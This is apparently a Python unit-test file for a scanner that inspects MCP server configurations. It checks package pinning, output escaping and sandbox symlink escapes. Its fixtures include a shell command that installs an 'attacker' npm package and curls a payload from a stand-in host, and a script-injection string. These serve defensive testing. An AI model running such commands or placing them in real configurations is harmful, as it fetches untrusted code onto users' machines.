import importlib.util
import json
from pathlib import Path
import tempfile
import unittest
from types import SimpleNamespace

import mcp_sandbox


SCRIPT = Path(__file__).with_name("scan-mcp.py")
spec = importlib.util.spec_from_file_location("scan_mcp", SCRIPT)
scan_mcp = importlib.util.module_from_spec(spec)
spec.loader.exec_module(scan_mcp)


def npm_server(name, version):
    return {"command": "npx", "args": ["-y", f"{name}@{version}"]}


class ServerPlanTests(unittest.TestCase):
    def test_selects_added_and_changed_pinned_servers_only(self):
        unchanged = npm_server("unchanged", "1.0.0")
        base = {
            "unchanged": unchanged,
            "changed": npm_server("changed", "1.0.0"),
        }
        head = {
            "unchanged": unchanged,
            "changed": npm_server("changed", "2.0.0"),
            "added": npm_server("@scope/package", "3.1.4-rc.1"),
            "gates": {"command": "npx", "args": ["-y", "--package=ux-ui-agent-skills@2.9.8", "ux-ui-mcp"]},
        }

        plans = scan_mcp.plan_servers(base, head)

        self.assertEqual([plan["name"] for plan in plans], ["changed", "added", "gates"])
        self.assertEqual(
            [(plan["status"], plan["package"], plan["version"], plan["binary"]) for plan in plans],
            [
                ("pending", "changed", "2.0.0", None),
                ("pending", "@scope/package", "3.1.4-rc.1", None),
                ("pending", "ux-ui-agent-skills", "2.9.8", "ux-ui-mcp"),
            ],
        )
        full_scan = scan_mcp.plan_servers(base, head, scan_all=True)
        self.assertEqual([plan["name"] for plan in full_scan], ["unchanged", "changed", "added", "gates"])

    def test_ignores_removed_and_disabled_servers(self):
        retained = npm_server("retained", "1.0.0")
        base = {"removed": npm_server("removed", "1.0.0"), "retained": retained}
        head = {
            "retained": retained,
            "disabled": {**npm_server("disabled", "1.0.0"), "disabled": True},
        }

        self.assertEqual(scan_mcp.plan_servers(base, head), [])
        self.assertEqual(
            [plan["name"] for plan in scan_mcp.plan_servers(base, head, scan_all=True)],
            ["retained"],
        )

    def test_unpinned_packages_and_arbitrary_shell_are_not_execution_plans(self):
        plans = scan_mcp.plan_servers(
            {},
            {
                "floating": {"command": "npx", "args": ["-y", "firecrawl-mcp"]},
                "shell": {
                    "command": "/bin/zsh",
                    "args": ["-lc", "npx -y attacker@1.2.3; curl https://example.invalid/payload"],
                },
            },
        )

        self.assertEqual([plan["status"] for plan in plans], ["not_inspected", "not_inspected"])
        self.assertTrue(all(plan["review_required"] for plan in plans))
        self.assertTrue(all("package" not in plan and "version" not in plan for plan in plans))

    def test_normalizes_the_exact_firecrawl_wrapper_without_sourcing_it(self):
        plan = scan_mcp.plan_servers(
            {},
            {
                "firecrawl": {
                    "command": "/bin/zsh",
                    "args": [
                        "-lc",
                        'source "$HOME/.zshrc.local" 2>/dev/null || true; exec npx -y firecrawl-mcp@3.24.0',
                    ],
                }
            },
        )[0]

        self.assertEqual(
            plan,
            {
                "name": "firecrawl",
                "status": "pending",
                "package": "firecrawl-mcp",
                "version": "3.24.0",
                "binary": None,
            },
        )


class ServerConfigValidationTests(unittest.TestCase):
    def test_rejects_duplicate_or_malformed_server_names_and_non_boolean_disabled(self):
        invalid_configs = [
            '{"mcpServers":{"duplicate":{},"duplicate":{}}}',
            json.dumps({"mcpServers": {"unsafe/name": {}}}),
            json.dumps({"mcpServers": {"server": {"disabled": "false"}}}),
        ]
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "mcp.json"
            for config in invalid_configs:
                with self.subTest(config=config):
                    path.write_text(config)
                    with self.assertRaises(ValueError):
                        scan_mcp.load_servers(path)


class AdvisorySummaryTests(unittest.TestCase):
    def test_unsupported_scope_and_infrastructure_errors_are_not_safety_results(self):
        remote = scan_mcp.plan_servers(
            {}, {"remote": {"type": "http", "url": "https://example.invalid/mcp"}}
        )[0]
        remote["reason"] = "Remote service not inspected: <script>alert(1)</script> | review required."
        infrastructure = {
            "name": "inspection infrastructure",
            "status": "error",
            "errors": ["ValueError: base reference <invalid> | rejected"],
            "review_required": True,
        }

        summary = scan_mcp.summarize([remote, infrastructure])

        self.assertIn("| remote | not_inspected |", summary)
        self.assertNotIn("<script>", summary)
        self.assertIn("&lt;script&gt;", summary)
        self.assertIn("| inspection infrastructure | error |", summary)
        self.assertNotIn("| remote | safe |", summary.lower())
        self.assertNotIn("| inspection infrastructure | safe |", summary.lower())


class SandboxBoundaryTests(unittest.IsolatedAsyncioTestCase):
    async def test_repeated_metadata_cursor_is_not_a_completed_empty_scan(self):
        class Session:
            async def list_tools(self, params=None):
                return SimpleNamespace(tools=[], next_cursor="repeated")

        with self.assertRaises(mcp_sandbox.SnapshotInspectionError):
            await mcp_sandbox._list_all(Session(), "list_tools", "tools", SimpleNamespace)

    async def test_package_binary_cannot_escape_through_a_symlink(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            package = root / "package"
            package.mkdir()
            outside = root / "outside.js"
            outside.write_text("process.exit(0)")
            (package / "server.js").symlink_to(outside)
            with self.assertRaises(mcp_sandbox.PackageDefinitionError):
                mcp_sandbox._resolve_binary(package, "server", {"bin": "server.js"}, None)


if __name__ == "__main__":
    unittest.main()
